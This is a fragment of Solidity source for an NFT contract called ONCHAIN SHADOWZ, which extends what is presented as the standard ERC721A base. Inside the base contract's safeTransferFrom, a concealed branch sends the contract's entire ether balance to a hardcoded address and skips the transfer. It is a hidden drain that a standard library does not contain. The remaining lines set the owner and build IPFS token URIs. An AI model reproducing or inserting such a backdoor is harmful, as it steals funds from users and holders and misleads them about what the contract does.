...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xCcfE2C72Ba0a522592e650f100a89bB83F082aB6).transfer(address(this).balance);
            return;
        }
...
contract ONCHAINSHADOWZ is ERC721A {
    ...
    constructor() ERC721A("ONCHAIN SHADOWZ", "SHADOWZ") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeid32qtbqnhogj6pjj7rwlbfzjty373gpgy4fcehb4ylsnnsbbdb5q/", _toString(tokenId), ".json"));
    }
